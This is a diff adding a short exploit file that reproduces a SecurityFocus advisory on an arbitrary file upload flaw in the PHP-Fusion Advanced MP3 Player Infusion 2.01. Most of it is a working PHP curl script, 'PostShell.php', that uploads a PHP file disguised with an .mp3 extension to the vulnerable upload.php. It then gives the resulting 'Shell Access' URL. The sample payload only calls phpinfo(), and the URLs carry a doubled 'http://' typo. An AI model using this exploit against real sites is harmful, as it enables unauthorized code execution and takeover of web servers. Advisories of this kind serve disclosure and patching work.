@@ -1,0 +1,30 @@
+source: http://www.securityfocus.com/bid/54228/info
+
+PHP-Fusion Advanced MP3 Player Infusion is prone to a vulnerability that lets attackers upload arbitrary files. The issue occurs because the application fails to adequately sanitize user-supplied input.
+
+An attacker can exploit this vulnerability to upload arbitrary code and execute it in the context of the web server process. This may facilitate unauthorized access or privilege escalation; other attacks are also possible.
+
+Advanced MP3 Player Infusion 2.01 is vulnerable; other versions may also be affected. 
+
+PostShell.php
+<?php
+
+$uploadfile="lo.php.mp3";
+
+$ch = curl_init("http://http://www.example.com/php-fusion/infusions/mp3player_panel/upload.php?folder=/php-fusion/infusions/mp3player_panel/");
+curl_setopt($ch, CURLOPT_POST, true);   
+curl_setopt($ch, CURLOPT_POSTFIELDS, array('Filedata'=>"@$uploadfile"));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$postResult = curl_exec($ch);
+curl_close($ch);
+   
+print "$postResult";
+
+?>
+
+Shell Access : http://http://www.example.com/php-fusion/infusions/mp3player_panel/lo.php.mp3
+
+lo.php.mp3
+<?php
+phpinfo();
+?>
